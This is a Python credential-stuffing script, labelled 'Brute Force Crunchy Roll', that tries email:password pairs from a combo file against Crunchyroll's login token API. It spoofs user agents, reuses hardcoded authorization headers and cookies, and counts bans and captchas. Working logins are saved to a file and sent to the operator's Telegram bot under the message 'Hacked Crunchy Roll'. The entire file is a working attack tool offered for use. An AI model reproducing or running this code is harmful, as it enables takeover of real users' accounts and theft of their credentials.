try:
	import requests,os
	from user_agent import generate_user_agent	
	from colorama import Fore
except ModuleNotFoundError:
	print('[!] منت محمل مكاتب يالسربوت بس اوك بحملك')
	os.system('pip install requests')
	os.system('pip install user_agent')
	os.system('pip install colorama')
	print('انتهيت[~]')
error=0
bad=0
ban=0
TweakPY=print
def Brute():
	global token,ID,ban,bad,error
	try:
		head = {
			'Host': 'beta-api.crunchyroll.com',
			'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
			'Content-Length': '72',
			'Accept': '*/*',
			'Cookie': '__cf_bm=e5139fd59755316a1d33207946e491eedca399d4-1622012072-1800-AXtJ1LgqzVNJZK3q5xqlwl/WszKCJLs42G5q/2Eol1mjpzqNk1vMvaNLTGLhSdox4RZOxCMM3j6m+7AgqcL21rJzugUjmo3ZHo+xht26QxhF',
			'Connection': 'keep-alive',
			'ETP-Anonymous-ID': '4CDCA8EE-660B-4820-86AC-65CC26A2834B',
			'User-Agent': generate_user_agent(),
			'Accept-Language': 'ar-SA;q=1.0',
			'Authorization': 'Basic M2V2eDJudnF1ZTB1eG5wemJ2aG86NGZMUWRmQmVJdk1yNlVPei1Fb1N3aXZ0cmZ6Ym9HOFU=',
			'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5'}	
		data= {
			'grant_type': 'password',
			'password': pess,
			'scope': 'offline_access',
			'username': user_email}
		req = requests.post('https://beta-api.crunchyroll.com/auth/v1/token',headers=head,data=data)
		if 'refresh_token' in req.text:
			TweakPY('--------------------------------')
			TweakPY(Fore.GREEN+f'Hacked Crunchy Roll ✅:\nemail: [{user_email}]\npassword: [{pess}]'+Fore.RESET)
			requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hacked Crunchy Roll ✅\n-------------------\nUser_Email ☑️:\t{user_email}\n-------------------\npassword 🔑:\t{pess}\n\nBy @TweakPY')
			with open('Good.txt', 'a') as x:
				x.write(user_email+":"+pess+'\n')
		elif 'force_password_reset' in req.text:
			TweakPY('--------------------------------')
			TweakPY(Fore.RED+f'NOT Hacked Crunchy Roll|[{bad}]❌'+Fore.RESET)
			bad+=1
		elif 'invalid_credentials' in req.text:
			TweakPY('--------------------------------')
			TweakPY(Fore.RED+f'NOT Hacked Crunchy Roll|[{bad}]❌'+Fore.RESET)
			bad+=1
		elif 'too_many_requests' in req.text:
			TweakPY('--------------------------------')
			TweakPY(Fore.CYAN+f'[❌ Ban|[{bad}]'+Fore.RESET)
			ban+=1
		elif '406 Not Acceptable' in req.text:
			TweakPY('--------------------------------')
			TweakPY(Fore.CYAN+f'[❌ Ban 5 min |{ban}]'+Fore.RESET)	
			ban+=1
		elif 'Attention Required!' in req.text:
			TweakPY('--------------------------------')
			TweakPY(Fore.RED+f"[!!] Captcha [Ban]|[{ban}]"+Fore.RESET)
			ban+=1
			Brute()
		else:
			TweakPY('--------------------------------')
			TweakPY(Fore.RED+f'Error ❌|[{error}]'+Fore.RESET)		
			error+=1
	except Exception as Bel:
		TweakPY(Fore.RED+'[!!] Error '+Fore.RESET+Bel)
		exit()
TweakPY(Fore.YELLOW+"""
######                                #######                             
#     # #####  #    # ##### ######    #        ####  #####   ####  ###### 
#     # #    # #    #   #   #         #       #    # #    # #    # #      
######  #    # #    #   #   #####     #####   #    # #    # #      #####  
#     # #####  #    #   #   #         #       #    # #####  #      #      
#     # #   #  #    #   #   #         #       #    # #   #  #    # #      
######  #    #  ####    #   ######    #        ####  #    #  ####  ###### 
                                                                          
 #####                                              ######                       
#     # #####  #    # #    #  ####  #    # #   #    #     #  ####  #      #      
#       #    # #    # ##   # #    # #    #  # #     #     # #    # #      #      
#       #    # #    # # #  # #      ######   #      ######  #    # #      #      
#       #####  #    # #  # # #      #    #   #      #   #   #    # #      #      
#     # #   #  #    # #   ## #    # #    #   #      #    #  #    # #      #      
 #####  #    #  ####  #    #  ####  #    #   #      #     #  ####  ###### ######                                                                                                                                 
"""+Fore.RESET)
TweakPY("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
TweakPY(Fore.BLUE+"Brute Force Crunchy Roll"+Fore.RESET)
TweakPY(Fore.RED+'By @TweakPY - @Filza2 ON TeleGram '+Fore.RESET)
TweakPY(Fore.MAGENTA+'Enjoy'+Fore.RESET)
TweakPY("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
ID=input(Fore.GREEN+"[?] Your telegram ID: "+Fore.RESET)
token=input(Fore.CYAN+"[?] Your bot token: "+Fore.RESET)
TweakPY("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
try:
	for i in open("combo.txt","r").read().splitlines():
		accs=str(i)
		pess=accs.split(":")[1]
		user_email=accs.split(":")[0]
		Brute()
		#if '406 Not Acceptable' in req.text:
			#exit(f'[!] You got ban [10/5] min')			
except Exception as Bel:
	print(Fore.RED+f"[!] Check your combo File please\n"+Fore.RESET,Bel)
